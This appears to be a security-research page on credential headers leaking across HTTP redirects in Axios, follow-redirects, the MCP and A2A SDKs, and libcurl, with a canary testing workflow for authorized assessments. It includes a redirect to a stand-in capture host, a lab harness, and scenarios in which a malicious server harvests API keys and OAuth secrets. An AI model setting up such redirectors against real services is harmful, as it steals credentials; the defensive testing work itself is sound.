# Axios proxy-authorization redirect boundary

## Operator value

Axios advisories [GHSA-j5f8-grm9-p9fc / CVE-2026-44486](https://github.com/advisories/GHSA-j5f8-grm9-p9fc) and [GHSA-p92q-9vqr-4j8v / CVE-2026-44487](https://github.com/advisories/GHSA-p92q-9vqr-4j8v) describe Node.js HTTP-adapter bugs where an authenticated proxy credential header can survive an automatic redirect after Axios re-evaluates the redirected request as direct/non-proxied.

For authorized testing, treat this as an outbound client and redirect-boundary check: can a URL you control cause a target service, worker, webhook fetcher, crawler, integration runner, or agent tool to disclose its `Proxy-Authorization` header to your final redirect origin?

## Affected surface

- Product: Axios / `axios`
- Ecosystem: npm
- Affected versions: `>= 1.0.0, < 1.16.0` and `<= 0.31.1`
- Fixed versions: `1.16.0` and `0.32.0`
- Required position: ability to influence a URL fetched by a Node.js process using Axios' Node HTTP adapter with automatic redirects enabled
- Required environment: authenticated proxy configuration such as `HTTP_PROXY=http://user:pass@proxy.example:8080`, with a redirect target that Axios resolves to no proxy, for example an `http://` URL redirecting to `https://` while `HTTPS_PROXY` is unset or a target excluded by `NO_PROXY`
- Not affected: browser, XHR, or fetch adapters; requests with `maxRedirects: 0`

## Recon workflow

1. Confirm scope allows outbound-callback testing and that you may operate a controlled redirect/capture endpoint.
2. Identify Node.js components that fetch attacker-influenced URLs:
   - webhook delivery testers;
   - URL previewers, crawlers, importers, or screenshot services;
   - CI, package, or artifact metadata fetchers;
   - agent tools that browse, summarize, or ingest remote URLs;
   - integration runners that call third-party APIs through corporate proxies.
3. Verify Axios and runtime details from authorized evidence: lockfiles, SBOM, container image inventory, dependency manifests, admin-provided package output, or a lab clone.
4. Determine whether the service uses authenticated proxy environment variables or Axios proxy configuration. A version match alone is not enough; the leak needs a proxy credential and redirect proxy-mode transition.
5. Map proxy rules that can create a proxied-to-direct transition, especially:
   - `HTTP_PROXY` set but `HTTPS_PROXY` unset;
   - protocol-changing redirects from `http://` to `https://`;
   - `NO_PROXY` rules that match the redirect target;
   - per-request Axios proxy overrides.

## Safe validation pattern

Use a lab clone or a production-safe canary endpoint with explicit approval. The goal is to prove header retention across redirect boundaries without collecting real credentials.

1. Configure a lab process with a canary proxy credential, never a real corporate password:

   ```bash
   export HTTP_PROXY='http://skillz-canary:proxy-boundary-canary@127.0.0.1:8080'
   unset HTTPS_PROXY
   ```

2. Prepare a controlled HTTP endpoint that returns a redirect to your controlled HTTPS endpoint:

   ```http
   HTTP/1.1 302 Found
   Location: https://capture.example.test/final
   ```

3. Trigger the target Axios fetch against the HTTP start URL. For a local lab harness:

   ```js
   import axios from "axios";

   await axios.get("http://redirector.example.test/start", {
     // Leave redirects enabled to exercise the affected path.
     maxRedirects: 5,
   });
   ```

4. Inspect only your controlled capture logs for the inert canary value:
   - **Contained:** `/final` receives no `Proxy-Authorization` header.
   - **Vulnerable boundary:** `/final` receives `Proxy-Authorization: Basic ...` containing the canary proxy credential.

5. Repeat with a fixed Axios version or `maxRedirects: 0` in the same lab to show the boundary closes.

## Targeted probes for bug-bounty workflows

When the assessed app exposes URL ingestion, use paired canary URLs rather than sensitive targets:

```text
https://capture.example.test/direct-ok
http://redirector.example.test/start-to-https-capture
```

Record whether the redirected request changes protocol, matches `NO_PROXY`, or otherwise changes from proxied to direct. Do not attempt to recover real proxy credentials; configure or request a canary credential for proof.

If you cannot observe server-side headers directly, use a unique canary username in the proxy URL and ask the program owner to confirm whether that exact marker appeared in controlled capture logs. Avoid broad blind testing that could send real credentials to third-party infrastructure.

## Evidence to capture

- Axios version and how it was verified.
- Node.js adapter path confirmation: server-side Node HTTP adapter, not browser/XHR/fetch.
- Proxy configuration class, redacted to avoid secrets; include only canary credentials if used.
- Redirect chain showing the transition from proxied initial URL to direct redirected URL.
- Minimal capture log showing presence or absence of `Proxy-Authorization` at the final origin.
- Confirmation that validation used controlled infrastructure and inert canary secrets.

## Report framing

Frame this as a stale proxy-auth header crossing an origin and proxy-mode boundary. The initial request legitimately needed `Proxy-Authorization` for the proxy, but redirect handling failed to clear the header when the final request no longer used that proxy. Impact depends on whether attacker-controlled URLs are fetched by a vulnerable Node.js Axios client that uses authenticated proxy settings and follows redirects automatically.

## October 20 follow-up: follow-redirects ships two silent failures of the same strip control

The redirect-time credential strip in Node's most widely deployed redirect library failed **open twice**, in two different ways, both published 2026-10-20. Same control as the Axios legs above — strip `Authorization`/`Proxy-Authorization`/`Cookie` before following a cross-origin redirect — two independent implementation defects, both silent.

**1. Array-form headers disable the strip entirely** — [GHSA-q3jh-wrc6-jgq8 / CVE-2026-111756, `follow-redirects`](https://github.com/advisories/GHSA-q3jh-wrc6-jgq8). Node's `http.request` accepts `options.headers` as an alternating `[name, value, name, value]` array (supported for ordering/duplication). `removeMatchingHeaders` iterates the container with `for...in` and matches header **names** against a regex — for an array, `for...in` yields `"0","1","2"`, never matches, and deletes nothing. Applications sending array-form headers leak `Authorization`, `Cookie`, `Proxy-Authorization`, plus the stale `Host` and (on POST→GET) `Content-Length` to any attacker-controlled redirect target. The `sensitiveHeaders` option added to fix the earlier CVE-2026-40895 relies on the same helper and is equally ineffective. Verified unchanged 1.15.11→1.16.0.

**2. Incomplete regex escaping fail-opens the custom-header filter** — [GHSA-8r9p-f939-6h3c / CVE-2026-111755](https://github.com/advisories/GHSA-8r9p-f939-6h3c). The filter is `^(?:` + declared names joined with `|` after a partial `escapeRegex` that misses `^`, `|`, `[`, `{`, `}`. RFC 9110 `tchar` permits `^` and `|` in header names, and Node accepts them: a declared sensitive name `X-Token|Secret` splits the alternation into two alternatives (`X-Token`, `Secret`) — the real header is never stripped while unrelated headers named `X-Token`/`Secret` get stripped as collateral. Silent for `^`/`|`, loud `SyntaxError` crash for `[`/`{`/`}` — same root cause, two failure modes. The filter is also built once at construction, so entries added in `beforeRedirect` are ignored.

**Operator rules:**
- **Iteration-structure mismatch is a control-bypass fingerprint**: a security filter that enumerates a container assuming one shape (object keys) silently no-ops on every other shape the sink accepts (arrays, `Map`, `Headers`). Node's array-form headers are a standing probe: any client library with header-removal/stripping logic gets an array-form cross-origin redirect canary.
- **Test the fix's own metacharacter boundary**: after a library adds a configurable deny/allow list compiled into a regex, feed it list entries containing regex metacharacters that the wire grammar permits. The CI blind spot is identical everywhere: fixtures use only metacharacter-free names.
- Bug-bounty shape: any Node service that fetches attacker-influenced URLs with `follow-redirects` and array-form or `^`/`|`-named credential headers leaks them on a 302 — same owned-redirector canary capture workflow as the Axios section above, with an array-form header variant and a `X-Api^Key`-style declared-name variant.

Sources: [GHSA-q3jh-wrc6-jgq8](https://github.com/advisories/GHSA-q3jh-wrc6-jgq8), [GHSA-8r9p-f939-6h3c](https://github.com/advisories/GHSA-8r9p-f939-6h3c), follow-redirects [commit 724087d](https://github.com/follow-redirects/follow-redirects/commit/724087d696c0bcd55c13ee0f3560c4558138e422) (strip present since v1.11.0) and [commit 844c4d3](https://github.com/follow-redirects/follow-redirects/commit/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9) (`sensitiveHeaders`).

## October 20 18:26Z follow-up: the MCP TypeScript SDK client is the next library to re-send credentials across a cross-origin redirect (CVE-2026-111769 / [GHSA-6prh-2h8m-c8cw](https://github.com/advisories/GHSA-6prh-2h8m-c8cw), fixed 1.32.0 / 2.x 2.3.0)

`@modelcontextprotocol/sdk`'s HTTP client transports (`StreamableHTTPClientTransport`, `SSEClientTransport`) and its OAuth helpers (`auth()` et al.) followed redirects to **any origin** and re-sent the request along with: custom `requestInit.headers` (e.g. an operator's `X-API-Key`), the `mcp-session-id` header, and — on `307`/`308` — the **request body**, which for OAuth token exchanges means `refresh_token` and `client_secret` in cleartext to the redirect target. The advisory notes current `fetch` drops only `Authorization` cross-origin; every other credential header and the body sail through. Fixed 1.x 1.32.0 / `@modelcontextprotocol/client` 2.3.0: redirects now same-origin-only, and never followed in browsers. Two operator-visible details: the vendor kept an escape hatch (`redirectPolicy: 'follow'`) that **restores the full exposure**, and the interim workaround is a `redirect: 'error'` fetch — both are grep fingerprints on pinned configs and wrapper code.

Durable axes:

1. **This is now a four-member family on this page** — Axios proxy-auth, follow-redirects array-form + regex-escape, and MCP SDK custom headers/body/session-ID. The invariant: the strip-cross-origin-credentials control is implemented per transport library, and each new library re-implements it from scratch, usually only covering `Authorization`. Inventory grep (`follow-redirects`, `axios`, `@modelcontextprotocol/sdk`) is the recon; every HTTP client library in the stack gets the same owned-redirector canary battery.
2. **`307`/`308` are the body-carrying variants** — a canary suite that only tests `302` misses the leg that leaks OAuth `refresh_token`/`client_secret`. Any token-exchange or signed-request client must be tested behind a lab `307`.
3. **Bug-bounty shape (agent/MCP infra):** an attacker-controlled or compromised MCP server (or authorization server) answers the client's first request with a `307` to attacker infrastructure and harvests the operator's API keys and OAuth secrets — the MCP client runs on developer workstations and CI, so one malicious server entry in a shared config harvests tool credentials. Lab proof: two owned endpoints (fake MCP server + capture sink), inert canary headers/tokens; never redirect toward real third parties.

## October 20 21:1xZ follow-up: A2A Java SDK — the server picks the credential header's *name*, and the Android transport overwrites its own no-redirect fix

The agent-to-agent (A2A) protocol's Java SDK shipped the fifth member of this page's strip-on-redirect family in a 21:04–21:08Z wave, with two new sub-axes the previous four libraries never hit:

**1. Server-controlled header name = credential routed around the strip** — [GHSA-9rhm-2h4x-jwmx / CVE-2026-111763](https://github.com/advisories/GHSA-9rhm-2h4x-jwmx). `AuthInterceptor` places the client's API key under the header name taken from the **remote agent's AgentCard** (`APIKeySecurityScheme.name()`, untrusted server-controlled data, and `location==HEADER` isn't even checked). JDK HttpClient's redirect handling strips only `Authorization` cross-origin — a malicious agent names its scheme header `X-Leaked-Cred`, answers with a `302` to attacker infrastructure, and the JDK client faithfully re-sends the credential to the redirect target. The credential *header name* is itself attacker-selected input; the strip exists but is addressed at the wrong name.

**2. Fix regression: second assignment wins** — [GHSA-4fpj-g9jf-9rgg / CVE-2026-111765](https://github.com/advisories/GHSA-4fpj-g9jf-9rgg) (Android http-client, 1.3.0–1.3.1, fixed 1.3.2). The GHSA-9rhm fix added `connection.setInstanceFollowRedirects(false)` in `createConnection()` — the synchronous `post()` builder then unconditionally re-sets it from its own `followRedirects = true` field default. On Android's repackaged OkHttp, cross-authority redirects strip `Authorization` but **retain nonstandard headers**, and the SDK's AuthInterceptor permits exactly four nonstandard credential names (`X-API-Key`, `API-Key`, `X-Auth-Token`, `X-Authentication`) — all four were confirmed forwarded to a second loopback authority with live values from the shipped Maven artifact.

Operator rules:
- **Enumerate every header name the credential layer can emit, then test each across a cross-origin redirect.** Probing only `Authorization` under-tests every modern client: this page's follow-redirects declared-names leg, the MCP SDK custom-headers leg, and now A2A's four-name allowlist all hide credentials under nonstandard names the redirect strip doesn't cover. Standard battery: one owned redirector, four name shapes (`Authorization`, `X-API-Key`, one `^`/`|`-named, one array-form header), one `307` body-carry leg.
- **Grep fix regressions by assignment count**: after a library ships a no-redirect security fix, search the same file/class for a second `setInstanceFollowRedirects(`/`followRedirects` assignment — builder defaults silently re-enabling a hard-coded security setting is a two-line audit. Behavior probe on the exact artifact: expect `302` returned to caller; a `200` from the collector means the leg is open.
- Bug-bounty shape (agent infra): any A2A/MCP client configured with credentials for an attacker-reachable agent harvests the key from one `302` — no client-side bug needed beyond the strip's name coverage. Lab proof stays on two owned loopback listeners with synthetic values.

Also in the same A2A wave: server-log credential spill on attacker-triggered parse failure (CVE-2026-111762 / [GHSA-x32g-jvvm-4725](https://github.com/advisories/GHSA-x32g-jvvm-4725) — adding one unknown JSON field forces the SEVERE full-body log, so the attacker *chooses* when secrets get written to logs; trigger-shape note only), fail-open default task authorization (CVE-2026-111764, folded on the [Feb 4 MCP cross-client page](2026-02-04-modelcontextprotocol-sdk-cross-client-data-leak-ghsa-345p-7cg4-v4c7.md)), and push-notification delivery SSRF (CVE-2026-111761, folded on the [July 30 URL-policy page](2026-07-30-url-policy-tenant-oauth-boundaries-ghsa.md)).

## October 20 23:1xZ family extension: the curl/libcurl coordinated client-side wave

The strip-on-redirect family gained its **client-tool member** in the 21:31Z coordinated libcurl release (~22 advisories, all GHSA version fields empty): a redirect to a userinfo URL re-sends a freshly minted ambient-identity Kerberos ticket to any host (GHSA-qqmr-6r9w-pmx5 / CVE-2026-94265), a malicious CONNECT proxy answering `401` instead of `407` harvests the *origin's* Basic/Negotiate credential (GHSA-6qvf-c7g3-j256 / CVE-2026-86414), ambient Negotiate state crosses origins via redirects and the connection cache, and `CURLOPT_AWS_SIGV4=NULL` never clears the signing state so the next transfer signs to a new URL with the previous AWS credential. Full wave (connection-reuse key gaps, wolfSSL/GnuTLS/Schannel build-specific validation bugs, cookie-jar/HSTS cache poisoning, `-J` + 103 Early Hints file overwrite, `CURLOPT_CRLF` IMAP pipelining) is on the dedicated page: [libcurl coordinated client-side wave](2026-10-20-libcurl-coordinated-wave-negotiate-redirect-credential-leak-connection-reuse-key-gaps-cache-poisoning-and-early-hints-overwrite-ghsa.md). Operator consequence for this page's battery: the owned-redirector canary suite must run against the stack's **curl build** (`curl -V` fingerprints the TLS backend first), not only against JS/Java HTTP libraries.

## Sources

- GitHub Advisory Database: [GHSA-j5f8-grm9-p9fc / CVE-2026-44486](https://github.com/advisories/GHSA-j5f8-grm9-p9fc)
- GitHub Advisory Database: [GHSA-p92q-9vqr-4j8v / CVE-2026-44487](https://github.com/advisories/GHSA-p92q-9vqr-4j8v)
- Axios project advisory: [GHSA-j5f8-grm9-p9fc](https://github.com/axios/axios/security/advisories/GHSA-j5f8-grm9-p9fc)
- Axios fix pull request: [axios/axios#10794](https://github.com/axios/axios/pull/10794)
- Axios v1 fix commit: [`afca61a070728e717203c2bc21e7b589b59b858b`](https://github.com/axios/axios/commit/afca61a070728e717203c2bc21e7b589b59b858b)
- Axios releases: [`v1.16.0`](https://github.com/axios/axios/releases/tag/v1.16.0), [`v0.32.0`](https://github.com/axios/axios/releases/tag/v0.32.0)
